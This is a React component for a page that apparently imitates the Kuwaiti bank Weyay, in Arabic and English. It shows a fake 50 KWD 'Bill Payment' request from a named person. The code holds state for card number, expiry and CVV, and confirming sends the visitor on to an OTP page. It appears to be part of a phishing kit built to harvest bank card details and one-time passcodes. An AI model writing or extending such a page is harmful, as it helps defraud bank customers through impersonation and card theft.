
import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

const CardDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: ""
  });
  const [loading, setLoading] = useState(false);

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '');
    const formatted = digitsOnly.replace(/(.{4})/g, '$1 ').trim();
    return formatted.slice(0, 19);
  };

  const formatExpiryDate = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '');
    if (digitsOnly.length >= 2) {
      return digitsOnly.slice(0, 2) + '/' + digitsOnly.slice(2, 4);
    }
    return digitsOnly;
  };

  const handleInputChange = (field: string, value: string) => {
    if (field === 'cardNumber') {
      setFormData({...formData, [field]: formatCardNumber(value)});
    } else if (field === 'expiryDate') {
      setFormData({...formData, [field]: formatExpiryDate(value)});
    } else if (field === 'cvv') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 3)});
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    setTimeout(() => {
      navigate(`/otp/${id}`);
    }, 2000);
  };

  const handleReject = () => {
    navigate('/error');
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-purple-900 via-purple-800 to-indigo-900 text-white">
      <div className="container mx-auto px-4 py-8 max-w-md">
        {/* Header with Bank Logo */}
        <div className="text-center mb-8 pt-8">
          <div className="text-2xl font-bold mb-2" style={{ fontFamily: 'Arial' }}>
            ويــاي <span className="text-emerald-400">≡</span>
          </div>
        </div>

        {/* Customer Avatar */}
        <div className="text-center mb-8">
          <div className="w-24 h-24 bg-gray-600 rounded-full mx-auto mb-4 flex items-center justify-center">
            <span className="text-3xl font-bold text-white">A</span>
          </div>
          <h2 className="text-xl font-semibold mb-2">AHMED MOHAMED ABDI</h2>
          <p className="text-gray-300 text-sm mb-6">طلب منك</p>
          
          {/* Amount */}
          <div className="text-center mb-8">
            <span className="text-5xl font-bold">50</span>
            <span className="text-lg">.000</span>
            <span className="text-sm ml-2">د.ك</span>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="space-y-4">
          {/* Bill Payment Button */}
          <div className="bg-gray-700/50 rounded-2xl p-4 text-center">
            <div className="text-right mb-2">
              <span className="text-sm text-gray-300">الغرض</span>
            </div>
            <div className="text-lg font-medium">Bill Payment</div>
          </div>

          {/* Reject Button */}
          <button
            onClick={handleReject}
            className="w-full bg-transparent border-2 border-gray-400 text-white py-4 rounded-2xl text-lg font-medium"
            disabled={loading}
          >
            رفض الطلب
          </button>

          {/* Confirm Button */}
          <button
            onClick={() => navigate(`/otp/${id}`)}
            className="w-full bg-emerald-400 text-black py-4 rounded-2xl text-xl font-bold"
            disabled={loading}
          >
            {loading ? (
              <>
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-black mr-2 inline-block"></div>
                جاري التحميل...
              </>
            ) : (
              'أكـد'
            )}
          </button>
        </div>
      </div>
    </div>
  );
};

export default CardDetails;
